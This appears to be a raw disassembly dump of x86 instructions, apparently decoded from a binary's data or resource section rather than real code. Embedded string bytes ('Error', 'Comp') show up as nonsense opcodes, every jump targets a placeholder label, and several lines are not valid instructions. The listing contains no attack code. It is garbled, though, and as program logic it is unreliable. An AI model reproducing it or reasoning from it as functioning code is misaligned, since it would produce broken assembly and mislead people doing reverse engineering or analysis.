add [ eax ] al
cmovbe ecx [ ecx + 0x67 ]
outsb
outsd
jb r-xdata
add [ eax ] al
push ebx
imul edi [ edx + 0x65 ] 0x9c000002
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
pop es
inc esi
inc edx
jne r-xdata
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
arpl [ eax ] ax
add [ eax ] ecx
push es
push ebx
je r-xdata
add [ eax ] al
push eax
jb r-xdata
jo r-xdata
jns r-xdata
add al 0x4e
add al [ eax ]
add [ eax + 0x800429b ] bh
add [ ecx ] cl
push edi
add al [ gs : eax ]
add [ ebx + ebx * 4 + 0x42 ] dh
add [ eax ] dl
add [ eax ] cl
push edx
popad
inc esp
popad
je r-xdata
push ebx
imul edi [ edx + 0x65 ] 0x20002
daa
add [ eax ] bh
dec ebp
inc ebx
add [ edi ] al
inc esp
jae r-xdata
add [ edx ] al
add [ esi ] al
push ebx
je r-xdata
inc ebx
push 0x72646c69
outsb
add al [ eax ]
add [ eax ] al
add eax 0x429d9b00
add [ eax + eax - 0xc ] al
push eax
outsd
jae r-xdata
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax ] bh
dec ebp
popad
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4108ffff ] al
outsb
arpl [ ebp + 0x73 ] sp
je r-xdata
jae r-xdata
jne r-xdata
add [ ebx ] cl
inc esi
jb r-xdata
popad
insd
add [ eax ] al
sbb [ eax ] al
add eax 0x429f2000
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ esi + ecx * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
add [ 0x429f2000 ] al
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
cwde
pushfd
inc edx
add [ eax ] al
sbb al 0x40
add al [ eax ]
add ah bh
fwait
inc edx
add [ eax ] cl
add [ ecx ] cl
push edi
jb r-xdata
je r-xdata
je r-xdata
inc esp
jb r-xdata
pushfd
adc [ eax ] al
adc al 0x0
add [ eax ] al
pop es
inc esi
inc edx
jne r-xdata
add [ eax ] al
inc ebp
jbe r-xdata
jb r-xdata
add [ eax + eax ] al
add ah [ eax - 0x61 ]
add [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5204ffff ] al
outsd
outsd
je r-xdata
push 0x66667542
jb r-xdata
add [ eax ] al
or [ eax ] al
add [ eax ] eax
and [ edi + 0x42 ] bl
add al 0x53
jns r-xdata
inc edx
add [ edx ] al
add [ edx ] al
jg r-xdata
add [ edx ] al
pushad
lahf
je r-xdata
popad
inc esp
popad
je r-xdata
inc esp
add al [ eax ]
add [ eax ] al
adc [ eax ] al
add al [ eax ]
pop es
dec eax
popad
jae r-xdata
jb r-xdata
jns r-xdata
jmp edx
add ah dh
inc ebp
outsb
add al [ fs : eax ]
add [ eax ] bl
aad 0x42
add [ eax ] bl
add [ eax ] al
add [ 0x6f6f5246 ] al
je r-xdata
add [ eax - 0x4f ] bh
outsb
je r-xdata
adc [ eax ] al
and al 0x0
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
inc edx
add [ edx ] al
add [ edx ] al
movsb [ edi ] [ esi ]
lahf
inc edx
add [ edx ] al
add [ edx ] al
insb
add al [ eax ]
add al [ eax ]
mov eax eax
and al 0x9f
inc edx
add [ edi ] al
push es
push esp
inc esi
imul ebp [ ebp + 0x72 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax ] ah
lahf
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
dec [ edx ]
dec esp
outsd
outsd
imul esi [ ebp + 0x70 ] 0x52
outsd
outsd
je r-xdata
aad 0x42
add [ eax + eax ] bl
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
popad
insd
add [ eax ] al
sbb [ eax ] al
add eax 0x429f2000
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ esi + ecx * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
add [ 0x429f2000 ] al
inc esp
popad
je r-xdata
add al [ gs : eax ]
add ah bh
fwait
inc edx
add [ eax ] dl
add [ eax ] cl
push edx
popad
inc esp
popad
je r-xdata
add [ eax ] al
or [ eax ] al
add [ eax ] eax
and [ edi + 0x42 ] bl
add al 0x53
insb
add al [ eax ]
add al [ eax ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax ] ah
lahf
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
outsd
outsd
je r-xdata
sbb ch dl
inc edx
add [ eax + eax ] bl
add [ eax ] al
or eax [ esi + 0x4c ]
outsd
outsd
imul esi [ ebp + 0x70 ] 0x52
add [ eax ] al
inc eax
adc al [ eax ]
or cl [ ebp + 0x65 ]
je r-xdata
add [ eax ] al
add al 0x8
push es
push edx
popad
jb r-xdata
add ah [ edi + ebx * 4 + 0x20042 ]
add al bh
lahf
inc edx
add [ edx ] al
add [ edx ] al
add [ eax ] bl
aad 0x42
add [ eax ] bl
add [ eax ] al
inc [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
insb
jne r-xdata
add al [ eax ]
add al [ eax ]
sub eax [ eax ]
add [ eax + 0x460b0042 ] ah
jae r-xdata
pushad
inc edx
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
add al [ eax ]
add [ eax ] al
adc [ eax ] al
add al [ eax ]
pop es
dec eax
popad
jae r-xdata
add al [ eax ]
add al [ eax ]
js r-xdata
push es
outsd
dec esi
popad
insd
add cl [ edx ]
dec ebp
push esp
push edx
popad
jb r-xdata
add [ eax + eax * 2 ] bl
popad
je r-xdata
clc
lahf
inc edx
jb r-xdata
jb r-xdata
inc eax
adc al [ eax ]
pop ebx
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax - 0x4f ] bh
jae r-xdata
add al [ gs : eax ]
add esp esp
adc [ eax ] al
pop es
inc ecx
jb r-xdata
outsd
dec esi
popad
je r-xdata
or cl [ ebp + 0x65 ]
je r-xdata
dec esi
popad
insd
push es
jae r-xdata
add al 0x4e
popad
outsb
add [ bx + si - 0x4f ] bh
inc edx
add [ eax ] bl
aad 0x42
add [ eax + 0x12 ] al
inc eax
add [ ebx ] bl
add [ eax ] al
sbb ch dl
inc edx
add [ ecx ] cl
add [ eax ] al
add eax [ eax ]
js r-xdata
add al [ eax ]
add [ eax ] eax
adc [ eax ] al
add eax 0x6f727245
jb r-xdata
inc eax
add [ 0x6f727245 ] al
jb r-xdata
jb r-xdata
jb r-xdata
add [ esi + ecx * 2 ] eax
push esp
push edx
popad
push es
push edx
popad
jb r-xdata
inc edx
add [ esi ] al
push edx
popad
jb r-xdata
add al [ eax ]
add [ eax + 0x12 ] eax
inc eax
add [ esi + ecx * 2 ] al
outsb
outsb
je r-xdata
inc eax
add [ ebp - 0x5f1fffc0 ] cl
inc edx
add [ eax ] cl
or eax 0x74655354
dec esi
jb r-xdata
outsb
add [ bx ] eax
inc ecx
jb r-xdata
add [ 0x706d6f43 ] cl
outsb
add [ 0x6f43 ] cl
insd
jo r-xdata
outsb
outsb
add [ bx + si - 0x4f ] bh
inc edx
add [ eax + 0x12 ] al
inc eax
add [ edi ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
js r-xdata
or [ ecx ] cl
inc ebx
outsd
push esp
push edx
popad
jb r-xdata
mov cl 0x42
jb r-xdata
inc eax
adc al [ eax ]
add al 0x4e
popad
insd
add al [ gs : eax ]
lea eax [ eax ]
jo r-xdata
add [ ecx ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ebp
jbe r-xdata
inc ebx
outsd
insd
jo r-xdata
outsb
je r-xdata
add [ ecx ] al
add [ eax ] dl
jae r-xdata
outsd
popad
insd
add al [ gs : eax ]
add ah al
pushad
inc edx
add [ esi ] cl
inc ebx
outsd
add al [ eax ]
outsb
outsb
add [ edx + 0x2000000 ] dl
add [ eax ] al
sbb ch dl
inc edx
popad
insd
push es
jae r-xdata
inc edx
add [ eax ] cl
adc edx [ edx + edx * 2 + 0x65 ]
jb r-xdata
inc edx
add [ esi ] al
push edx
popad
jb r-xdata
jb r-xdata
outsb
outsb
je r-xdata
outsb
insd
jo r-xdata
or [ ebx + 0x6f ] eax
je r-xdata
outsb
inc edx
add [ esi ] al
push edx
popad
jb r-xdata
outsb
outsd
je r-xdata
outsd
insd
jo r-xdata
add ecx [ eax ]
add al ah
mov al [ 0xd080042 ]
push esp
push ebx
je r-xdata
pop es
push eax
outsd
imul ebp [ esi + 0x74 ] 0x5017265
inc ebp
jb r-xdata
add [ eax ] bl
aad 0x42
push esp
inc ebx
outsd
insd
add al [ eax ]
adc [ ebx + 0xc080042 ] ah
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
js r-xdata
insb
popad
jae r-xdata
je r-xdata
outsb
jae r-xdata
outsb
arpl [ ebp + 0x4e ] sp
popad
insd
inc ebp
jbe r-xdata
popad
insd
add al [ gs : eax ]
fsub [ ecx + 0x16080042 ]
push esp
inc ecx
outsb
arpl [ ebp + 0x73 ] sp
je r-xdata
inc eax
adc al [ eax ]
add al 0x4e
add [ ecx ] al
jae r-xdata
add [ esi + ecx * 2 ] eax
push esp
inc ebx
outsd
outsb
outsb
inc eax
adc al [ eax ]
or eax 0x706d6f43
add [ eax ] al
jb r-xdata
insb
popad
jae r-xdata
jae r-xdata
outsd
outsb
outsb
outsb
je r-xdata
outsd
jb r-xdata
jb r-xdata
outsb
outsb
je r-xdata
inc edx
add [ eax + 0x12 ] al
inc eax
add [ eax ] al
adc [ eax ] al
pop eax
outsb
outsb
je r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax - 0x4f ] bh
inc edx
add [ esi ] al
push edx
popad
jb r-xdata
jb r-xdata
jo r-xdata
insb
adc [ eax + edx * 2 + 0x65 ] dl
jb r-xdata
add [ eax ] bl
aad 0x42
adc al [ eax ]
outsd
jne r-xdata
je r-xdata
outsb
inc ebx
outsd
insd
or [ ecx ] ecx
inc ebx
outsd
insd
jo r-xdata
insd
jo r-xdata
jae r-xdata
les esp [ eax + 0x42 ]
inc ebp
jbe r-xdata
jb r-xdata
add cl [ eax ]
push es
push edx
popad
popad
insd
push es
dec esi
add al 0x4e
add [ eax - 0x4f ] bh
inc edx
add [ eax + 0x12 ] al
inc eax
add ah ah
adc [ eax ] al
add [ eax ] dl
inc eax
add [ edx ] dh
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
js r-xdata
inc edx
outsd
outsd
insb
popad
outsb
inc eax
adc al [ eax ]
pop es
dec ebp
jae r-xdata
add [ eax ] al
push esp
push edx
popad
jb r-xdata
mov [ 0xc080042 ] eax
add [ eax ] dl
add [ eax + eax ] bh
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
sbb ch dl
inc edx
add [ ecx ] cl
inc ebx
outsd
insd
jo r-xdata
sbb ch dl
inc edx
dec eax
popad
outsb
insb
add al [ fs : eax ]
nop
pushfd
mov [ 0x18080042 ] eax
push esp
inc esi
imul ebp [ esi + 0x64 ] 0x706d6f43
outsd
jb r-xdata
jb r-xdata
add al [ eax ]
add [ eax ] ebx
aad 0x42
popad
jae r-xdata
imul esi [ ebx + 0x74 ] 0x43746e65
or [ esi ] al
outsb
outsb
je r-xdata
jo r-xdata
outsb
outsb
je r-xdata
add [ ecx ] cl
add [ ecx ] al
sbb ch dl
inc edx
je r-xdata
outsb
add [ eax + 0x12 ] al
inc eax
add ah al
pushad
inc edx
outsb
je r-xdata
insd
push es
jae r-xdata
push 0x614e646f
inc edx
add [ esi ] al
push edx
popad
jb r-xdata
insb
popad
add al [ gs : bx + si ]
add [ eax ] eax
adc [ eax ] al
pop es
outsd
insb
popad
jae r-xdata
push edx
popad
jb r-xdata
add ecx [ eax ]
push es
add al [ edi ]
push esp
push edx
popad
jb r-xdata
mov esp 0x80042a2
inc ebx
outsd
insd
jo r-xdata
add [ eax + r-xdata ] dl
or [ ebx ] dl
push esp
push edx
popad
add [ eax - 0x4f ] bh
push esp
inc ebx
outsd
insd
jo r-xdata
add al 0x8
push es
push edx
popad
jb r-xdata
popad
add [ eax - 0x4f ] bh
inc edx
add [ eax + 0x12 ] al
inc eax
add [ eax ] cl
mov al [ 0x750042 ]
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
js r-xdata
inc ebx
adc al [ eax ]
or [ ebx + 0x6c ] eax
inc ebp
outsb
je r-xdata
popad
jae r-xdata
dec ebp
pop es
push es
jae r-xdata
outsb
outsb
je r-xdata
adc edx [ edx + edx * 2 + 0x65 ]
popad
inc edx
add [ eax ] cl
outsb
outsb
je r-xdata
je r-xdata
add cl [ 0x706d6f43 ]
push esp
push edx
popad
jb r-xdata
add [ esi ] cl
push esp
push edx
popad
jb r-xdata
add cl [ ecx ]
inc ebx
inc edx
add [ esi ] al
outsb
outsb
outsb
outsb
outsb
je r-xdata
outsd
insd
jo r-xdata
dec esi
popad
insd
add al [ gs : eax ]
add [ eax ] ecx
mov al [ 0x430e0042 ]
push edx
popad
jb r-xdata
push es
outsb
je r-xdata
jae r-xdata
jb r-xdata
add [ edi ] eax
push eax
jb r-xdata
js r-xdata
outsd
insd
jo r-xdata
outsd
or eax 0x706d6f43
aad 0x42
add [ ecx ] cl
inc ebx
outsd
insd
jo r-xdata
outsb
outsb
je r-xdata
inc ebx
outsd
push cs
inc ebx
dec esi
popad
insd
push es
jae r-xdata
inc eax
add [ eax ] al
js r-xdata
popad
jae r-xdata
insb
popad
jae r-xdata
add [ eax - 0x4f ] bh
push esp
inc ebx
outsd
add ecx [ eax ]
push es
push edx
popad
jb r-xdata
popad
jae r-xdata
jbe r-xdata
outsd
outsb
dec eax
popad
outsb
insb
pop es
outsb
add [ bx ] eax
arpl [ eax ] ax
add [ eax ] ecx
or [ ebx + 0x6f ] eax
insd
jo r-xdata
inc edx
outsb
outsb
add [ eax + 0x12 ] al
inc eax
add [ eax ] al
adc al 0x40
add [ eax ] al
adc [ eax ] al
jpe r-xdata
outsb
outsb
je r-xdata
add eax [ eax ]
insb
inc edx
add [ esi ] dh
add al [ eax ]
lea eax [ eax ]
push eax
movsb [ edi ] [ esi ]
inc edx
add [ eax ] cl
adc eax 0x65724354
inc eax
add [ eax - 0x5c ] dl
jb r-xdata
jbe r-xdata
inc edx
add [ eax ] cl
mov al [ 0xffffffffd5180042 ]
add al [ eax ]
mov eax eax
add al 0xa5
inc edx
andps xmm0 [ ebx + 0x6f ]
insd
jo r-xdata
insd
jo r-xdata
inc edx
jbe r-xdata
je r-xdata
outsb
outsb
push esp
push edx
popad
jb r-xdata
inc edx
outsd
outsd
insb
popad
outsb
add [ eax - 0x4f ] bh
pop es
outsb
outsb
je r-xdata
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
rol [ 0x18080042 ] 0x54
inc esi
imul ebp [ esi + 0x64 ] 0x6874654d
add [ eax ] cl
sbb [ esi + eax * 2 + 0x69 ] dl
outsb
dec ebp
add [ ebx + 0x42a504c0 ] cl
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
outsd
insd
jo r-xdata
je r-xdata
outsb
add [ 0x6f43 ] ecx
insd
jo r-xdata
js r-xdata
outsb
je r-xdata
js r-xdata
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
outsd
dec ecx
outsb
jae r-xdata
outsb
outsb
je r-xdata
or [ eax + 0x430e0042 ] ah
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax - 0x4f ] bh
outsb
je r-xdata
insb
popad
jae r-xdata
or [ ebx + 0x6c ] eax
push 0x614e646f
inc edx
add [ esi ] al
push edx
popad
jb r-xdata
popad
popad
outsb
arpl [ ebp + 0x45 ] sp
add [ esi ] al
push edx
popad
jb r-xdata
outsb
outsb
popad
je r-xdata
or [ 0x65724354 ] dl
outsb
outsb
je r-xdata
jb r-xdata
add ecx [ eax ]
push es
push edx
popad
insb
popad
jae r-xdata
push 0x501646f
inc ebp
jb r-xdata
outsb
outsb
je r-xdata
inc eax
adc al [ eax ]
or cl [ ebp + 0x65 ]
je r-xdata
add [ eax ] al
add al 0x8
push es
push edx
popad
jb r-xdata
inc eax
add [ 0x6f727245 ] al
jb r-xdata
insd
jo r-xdata
popad
jae r-xdata
insb
insb
popad
jae r-xdata
je r-xdata
or [ ecx ] ecx
inc ebx
outsd
insd
jo r-xdata
inc ebx
outsd
push edx
popad
jb r-xdata
insb
popad
jae r-xdata
or [ ecx + 0x6e ] cl
outsd
dec esi
popad
insd
add cl [ edx ]
dec ebp
push esp
outsd
insd
jo r-xdata
inc eax
add ah al
movsd [ edi ] [ esi ]
inc edx
add [ eax ] cl
sbb edx [ esi + eax * 2 + 0x69 ]
outsb
inc ebx
add [ ebp - 0x5a3bffc0 ] cl
je r-xdata
outsb
adc [ bx ] eax
inc ecx
dec ebp
je r-xdata
outsd
andps xmm0 [ ebx + 0x6f ]
insd
jo r-xdata
add al 0x4e
popad
insd
add al [ gs : eax ]
outsb
outsb
je r-xdata
add [ eax - 0x4f ] bh
inc edx
inc edx
outsd
je r-xdata
or cl [ ebp + 0x65 ]
je r-xdata
outsd
insb
popad
outsb
add al [ eax ]
add [ eax ] ebx
inc edx
add [ eax + eax - 0x63c00000 ] dl
popad
outsb
arpl [ ebp + 0x7 ] sp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x78007265
mov cl 0x42
add [ eax + 0x12 ] al
inc eax
add ah ah
adc [ eax ] al
add [ gs : eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax - 0x4f ] bh
jb r-xdata
outsd
add al [ fs : eax ]
add [ eax ] eax
add al [ gs : eax ]
add [ eax ] eax
adc al 0x40
add [ edi ] al
inc ecx
dec ebp
je r-xdata
insd
push es
jae r-xdata
outsd
dec esi
popad
adc [ eax ] al
add eax 0x6f727245
outsd
pop es
push esp
dec ebp
je r-xdata
je r-xdata
outsb
outsb
outsb
je r-xdata
inc ebx
add [ eax + 0x59 ] dh
inc ebx
add [ eax - 0x77ffbc7d ] ah
add [ ebx ] 0x7c
push 0x43
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
sbb ch dl
inc edx
add [ eax ] ch
add [ eax ] al
add [ esi ] al
inc esi
dec edi
ja r-xdata
rol [ edx + 0x59000043 ] 0x1
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al al
push esi
inc ebx
add [ eax + 0x4d ] ah
inc ebx
add [ eax - 0x3bffbca9 ] cl
push edi
inc ebx
add ah al
pop ebx
inc ebx
add ah bl
pop eax
inc ebx
add al dl
add [ ebx ] 0x0
pop ecx
popad
outsb
arpl [ ebp + 0x2 ] sp
add [ ebx + 0x42a6b0c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
cmpsb [ esi ] [ edi ]
inc edx
add [ ebp ] ah
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
js r-xdata
outsb
jae r-xdata
outsb
jae r-xdata
jb r-xdata
inc eax
adc al [ eax ]
add [ eax ] al
jb r-xdata
outsd
add [ fs : 0x6f727245 ] eax
je r-xdata
inc edx
add [ esi ] al
push edx
popad
jb r-xdata
jae r-xdata
dec ecx
outsb
popad
outsb
arpl [ ebp + 0x45 ] sp
jbe r-xdata
adc eax 0x466e4f46
imul ebp [ esi + 0x64 ] 0x706d6f43
outsd
outsb
outsb
je r-xdata
popad
outsb
arpl [ ebp + 0x2 ] sp
add [ eax ] al
sbb ch dl
inc edx
add [ eax + eax ] ch
add [ eax ] al
pop es
inc esi
push eax
popad
jb r-xdata
add [ eax ] al
add ecx [ eax ]
push es
push edx
popad
jb r-xdata
add esp esp
adc [ eax ] al
or [ ecx + 0x6e ] cl
add al [ eax ]
outsb
outsb
arpl [ ebp + 0x2 ] sp
add [ eax ] al
inc eax
adc al [ eax ]
add [ eax ] 0x0
add [ ecx ] cl
inc esi
insb
popad
jae r-xdata
jb r-xdata
popad
insd
add al [ gs : eax ]
add [ ecx + 0x42 ] ch
add [ eax ] dl
add [ eax ] al
adc [ esi + 0x4f ] al
outsb
push edx
jb r-xdata
fsub [ eax + r-xdata ]
add [ eax ] al
or al [ esi + 0x4f ]
outsb
push ebx
je r-xdata
outsb
je r-xdata
add al [ esi + ecx * 2 ]
push esp
push edx
popad
jb r-xdata
inc edx
add ah dh
dec [ ebx + 0x420042ab ]
add ah dh
jo r-xdata
add [ eax ] al
adc [ esi + 0x43 ] eax
add al [ eax ]
add [ esp + 0x42 ] cl
add [ eax ] dh
add [ eax ] al
adc al [ esi + 0x4f ]
push eax
jb r-xdata
outsd
jb r-xdata
outsb
inc ebx
jb r-xdata
add [ edx ] dl
inc esi
outsb
arpl [ ebp + 0x4e ] sp
popad
insd
add al [ gs : eax ]
add ah dl
mov eax [ 0x580042 ]
add [ eax ] al
adc eax [ esi + 0x4f ]
outsb
inc ecx
outsb
arpl [ ebp + 0x73 ] sp
je r-xdata
fcomp [ edx + 0x42 ]
add [ eax ] dh
add [ eax ] al
add [ edi ] al
inc esi
inc esi
imul edi [ eax + 0x75 ] 0x27370
add ah bl
pop edx
inc edx
add [ eax + eax ] dh
add [ eax ] al
pop es
inc esi
dec esp
outsd
popad
add al [ fs : eax ]
add [ eax ] ah
inc edx
add [ eax ] bh
add [ eax ] al
add [ 0x466e4f46 ] cl
imul ebp [ esi + 0x64 ] 0x6874654d
outsd
add al [ fs : eax ]
add [ eax ] al
movsd [ edi ] [ esi ]
inc edx
add [ eax ] al
add [ eax ] al
adc eax 0x466e4f46
imul ebp [ esi + 0x64 ] 0x6874654d
outsd
dec ecx
add [ eax ] al
mov [ eax + 0x42 ] ch
add [ eax ] al
mov ah 0xa9
jb r-xdata
popad
insd
push es
jae r-xdata
add al 0x4e
add ah dh
dec [ ebx - 0x56 ]
popad
insd
add al [ gs : eax ]
add [ eax ] al
0x840042 0x0
pop es
inc esi
inc esi
imul ebp [ esi + 0x64 ] 0x27265
add [ eax ] al
adc [ eax ] al
mov [ eax ] al
lodsb [ esi ]
inc edx
add [ edx ] al
hlt
jo r-xdata
popad
outsb
inc ebx
popad
je r-xdata
cwde
mov [ 0x680042 ] eax
add [ eax ] al
add [ eax ] al
inc ebx
outsd
insd
jo r-xdata
jb r-xdata
add [ ecx + esi * 4 + 0x42 ] bh
add dh ch
cmpsb [ esi ] [ edi ]
inc edx
add [ eax + 0x42a8 ] cl
add [ eax ] al
add [ ecx + ebp * 4 + 0x940042 ] dh
add [ eax ] al
inc eax
pushfd
jae r-xdata
outsb
add [ bx + si ] ecx
dec ecx
outsb
add ah dh
dec ebp
lodsb [ esi ]
inc edx
add [ edx ] al
hlt
jae r-xdata
dec eax
popad
outsb
insb
inc ebp
js r-xdata
inc ebx
outsd
insd
jo r-xdata
inc edx
add [ edx ] cl
add [ eax ] eax
mov ebp 0x4a0042aa
dec ebx
stosb [ edi ]
outsb
outsb
outsd
je r-xdata
add [ 0x42a9bc00 ] ah
add [ eax ] al
add [ ebp ] cl
add [ eax ] al
and eax 0x42a9bc00
outsb
outsb
je r-xdata
jo r-xdata
outsb
jae r-xdata
dec edi
outsd
jne r-xdata
shl [ ebp + 0x780042 ] 0x0
add [ eax ] bl
inc esi
dec edi
outsb
inc esi
imul ebp [ esi + 0x64 ] 0x706d6f43
outsd
add [ eax ] al
add [ edx ] al
add [ 0x420042ab ] dh
add ah dh
[ esi - 0x55 ]
inc edx
add [ edx ] al
hlt
popad
je r-xdata
outsb
add al [ fs : eax ]
add [ ebx ] cl
inc edx
add [ eax ] ah
add [ eax ] al
or [ esi + 0x4f ] al
outsb
inc ebp
sub_4294e7
add [ eax ] al
inc esp
push ds
inc eax
add [ eax + eax ] dl
or dh [ eax + 0x63 ]
bound edx [ edi + 0x72 ]
imul esi [ esp + esi * 2 + 0x65 ] 0x200026e
add [ eax ] ah
adc al 0xd3
inc ebx
add [ ebx + edx * 2 ] al
imul eax [ gs : ebx ] 0x3
pushfd
adc al [ eax ]
sbb al 0x0
add al 0x0
cwde
xchg edi eax
inc edx
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ ecx + edx ] dl
inc eax
add [ eax + eax ] cl
or [ esp + ebp * 2 + 0x69 ] ah
bound ecx [ ebp + 0x6f ]
jbe r-xdata
add al [ eax ]
add al [ eax ]
add al [ eax ]
add [ eax + edx + 0x140040 ] bl
or [ edi + esi * 2 + 0x4f ] ah
jb r-xdata
add al [ eax ]
push esp
outsd
add eax [ ebx ]
pushfd
adc al [ eax ]
and [ eax ] al
add eax 0x42979800
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ ebx + ecx * 8 ] dh
imul ebp [ bp + 0x2 ] 0x11142100
inc eax
add [ eax ] bl
add [ esi ] cl
insb
imul esp [ edx + 0x4e ] 0x6f507765
jae r-xdata
imul esp [ edx + 0x4f ] 0x65736666
inc ebx
outsd
insd
insd
imul esi [ esi + eax * 2 + 0x6c ] 0x2736761
add [ edx ] al
add [ esi ] ah
add [ eax ] dl
salc
inc ebx
add [ esi ] al
push edx
jbe r-xdata
add [ edx ] al
add [ ebp ] bl
sbb al 0xd6
je r-xdata

je r-xdata
adc al 0x11
inc eax
add [ eax + eax ] dl
add ah [ ebx + 0x62 ]
add al [ eax ]
add [ eax + edx + 0x1c0040 ] bl
add [ eax ] al
or ah [ edi + esi * 2 + 0x4c ]
outsd
arpl [ ebx + 0x54 ] bp
jns r-xdata
inc eax
add [ eax + eax ] bl
jb r-xdata
inc eax
add [ eax + eax ] dl
add ah [ ebx + 0x62 ]
add al [ eax ]
add [ eax + edx + 0x1c0040 ] bl
or ah [ edi + esi * 2 + 0x4c ]
outsd
arpl [ ebx + 0x54 ] bp
jns r-xdata
je r-xdata
inc eax
add [ eax ] ah
add [ eax + eax ] al
cwde
xchg edi eax
inc edx
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ ecx + edx ] dl
inc eax
add [ eax + eax ] cl
or [ ecx + ebp * 2 + 0x62 ] ebp
dec edi
jae r-xdata
imul edx [ edx + 0x65 ] 0x67
imul ebp [ edi + 0x6e ] 0x129c0303
add [ eax + edx + 0xc0040 ] bl
push cs
jb r-xdata
outsb
add al [ eax ]
add al [ eax ]
add [ esi + edx * 8 ] al
inc ebx
add [ esi ] al
inc ebx
outsd
insd
insd
imul esi [ ebx + eax + 0x3 ] r-xdata
adc [ eax ] al
add al [ eax ]
cwde
xchg edi eax
inc edx
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + eax ] cl
add esi [ ebx + 0x74 ]
insd
add al [ eax ]
add [ ecx + edx ] dl
inc eax
add [ eax ] dl
add [ edx ] al
arpl [ edx + 0x2 ] sp
add [ ecx ] ah
adc al 0x11
inc eax
add [ eax ] bl
add [ esi ] al
arpl [ edx + 0x52 ] sp
popad
add al [ fs : eax ]
and [ ecx + edx ] edx
outsd
outsb
add al [ eax ]
add al [ eax ]
cmp eax [ eax ]
cwde
rol [ ebx ] cl
pop es
push ebx
je r-xdata
add ebx [ edx + edx + 0x140040 ]
add al [ gs : eax ]
add al [ eax ]
pop edi
add [ eax ] ch
salc
inc ebx
add [ edx * 2 + 0x636f6c6e ] cl
imul edx [ edx + 0x65 ] 0x67
imul ebp [ edi + 0x6e ] 0x129c0303
inc eax
add [ eax ] ah
add [ eax + eax ] al
cwde
xchg edi eax
inc edx
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ ecx + edx ] dl
inc eax
add [ eax + eax ] cl
or [ ecx + ebp * 2 + 0x62 ] ebp
dec edi
jae r-xdata
inc ebx
add [ edx ] cl
dec esp
outsd
arpl [ ebx + 0x52 ] bp
imul ebp [ gs : bx + 0x6e ] 0x129c0303
add eax [ ebx ]
pushfd
adc al [ eax ]
or al 0x0
add [ eax ] eax
cwde
xchg edi eax
inc edx
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
pop ebp
add [ esi + edx * 8 ] bl
add al [ eax ]
add al [ gs : eax ]
add al [ eax ]
dec edx
add [ esi + edx * 8 ] dh
inc ebx
add [ ebx + edx * 2 ] al
